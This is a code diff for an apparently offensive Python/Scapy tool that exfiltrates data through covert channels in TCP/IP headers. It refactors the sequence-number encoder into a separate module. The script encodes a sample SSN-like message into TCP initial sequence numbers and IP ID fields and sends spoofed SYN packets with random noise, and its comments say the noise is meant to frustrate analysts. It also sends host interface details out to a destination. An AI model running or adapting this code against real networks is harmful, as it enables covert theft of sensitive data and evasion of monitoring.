@@ -61,7 +61,10 @@ import netifaces
 import re
 import time
 
-#from IPy import IP # Namespace collision with scapy
+# Custom function definitions
+from lib import initialSeqFerret
+from lib import ipidFerret
+
 import IPy
 from optparse import OptionParser
 
@@ -119,7 +122,8 @@ while mode != 'demo' and mode != 'live':
 # mode = 'live'
 
 thishost = os.uname()[1]
-multiplier = 16777216  # the server will be performing the division
+
+
 
 # An example sending a SSN, with the hyphens to make it look like a SSN. A
 # smooth criminal may try to obfuscate the SSN.
@@ -127,7 +131,7 @@ multiplier = 16777216  # the server will be performing the division
 #message = '111-22-3333 from ' + thishost + '\n'
 message = 'foo bar 111-22-3333'
 # Clear before each use. Used by initial sequence numbers and IP ID tests
-exfilArray = []
+#-exfilArray = []
 
 # Get destination from the command-line.
 #-destination = str(sys.argv[1])
@@ -172,44 +176,22 @@ def is_16bit(x):
         return False
 
 
-# Does x fit in a 32bit int?
-# We need this for iseq
-def is_32bit(x):
-    bitl = (x).bit_length()
-    if bitl <= 32:
-        # print '[*] OK: int is 32bit'
-        return True
-    else:
-        # print '[-] Warning: int is too large.'
-        return False
-
-
 # Set the ttl=60 to indicate end-of-message
-def send_eom():
+def send_eom(pkt):
+    """Send the last message, encoded with a special TTL to let
+	the server know we're done.
+
+	Args:
+		pkt (Packet): Scapy packet
+    """
     print '[*] Sending End-Of-Message'
-    pkt.window = 7331
+    pkt.window = 7331 # It's a magical number!
     send(pkt)
 
 
 # Convert message
 # Lots of options here but we're going to convert each letter of the message
 # to its decimal equivalent.. which will be multiplied by the multiplier.
-def convert_iseq(message):
-    print '[*] converting iseq message: %s' % message
-    for char in message:
-        c = ord(char)
-        # While we are here, might as well generate our SYN packet sequence
-        # number.
-        exfilChar = c * multiplier
-        # Add seq to the global exfilArray.
-        if is_32bit(exfilChar):
-            print '[+] iseq size OK'
-        else:
-            print '[-] Warning: iseq int too large %d. Setting to X' % exfilChar
-            # TODO: recover safely, setting to X for now
-            exfilChar = ord(X) * multiplier
-        exfilArray.append(exfilChar)
-        print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
 
 
 def convert_ipid(message):
@@ -248,19 +230,6 @@ def trim_message(message):
     return trimmed
 
 
-def add_n0ise_iseq(i):
-    print '[*] adding n0ise to iseq..'
-    y = exfilArray[i]
-    # Add some randomness
-    randy = random.randint(-9999999, 9999999)  # too large will produce error
-    pkt.seq = y + randy
-    # Signal noisy packet
-    pkt.window = int(8182) - random.randint(23, 275)
-    try:
-        send(pkt)
-    except socket.error:
-        print "\nERROR: Problem sending packets, are you root?\n"
-        exit(0)
 
 
 def add_n0ise_ipid(i):
@@ -297,26 +266,8 @@ def exfil_ipid():
             print "\nERROR: Problem sending packets, are you root?\n"
             exit(0)
         i += 1
-    send_eom()
+    send_eom(pkt)
 
-
-# Send message using initial sequence numbers. Add noise.
-def exfil_iseq():
-    i = 0
-    for c in exfilArray:
-        add_n0ise_iseq(i)
-        pkt.window = 1337
-        pkt.seq = exfilArray[i]
-        # slow our roll
-        time.sleep(0.4)
-        try:
-            print '[window] ' + str(pkt.window)
-            send(pkt)
-        except socket.error:
-            print "\nERROR: Problem sending packets, are you root?\n"
-            exit(0)
-        i += 1
-    send_eom()
 
 
 def exfil_bounce():
@@ -335,7 +286,7 @@ def exfil_bounce():
             print "\nERROR: Problem sending packets, are you root?\n"
             exit(0)
         i += 1
-    send_eom()
+    send_eom(pkt)
 
 
 # This function sends interface details for interfaces of interest, AF_INET
@@ -373,23 +324,25 @@ def send_iface():
 # ==== use iseq
 # Convert our original message. Later we'll update our message and send
 # network interface data.
-convert_iseq(message)
+#-exfilArray = convert_iseq(message)
 # How long is our message. We can use this when adding noise. If we use the
 # ttl then this will be easy to crack. We might be able to create an algorithm
 # that's complex enough to at least frustrate analysts.
-msglen = len(exfilArray)
+#-msglen = len(exfilArray)
 
 # Future work: adjust some fields to perhaps better emulate commonly seen traffic.
 # TODO we should add dport and flags as configurable options.
 # TODO add check, sys.argv[2] must be between 1-65565
 #-dstport = int(sys.argv[2])
 # Craft our basic packet.
-pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')
+#-pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')
 
 # Attempt data exfiltration using initial sequence numbers
-exfil_iseq()
+initialSeqFerret.exfil_iseq(spoof, destination, dstport, message)
 print '[*] Sent using iseq: %s' % message
 
+print 'All done'
+exit()
 exfilArray = []  # clear before each use
 
 # ==== use IPID
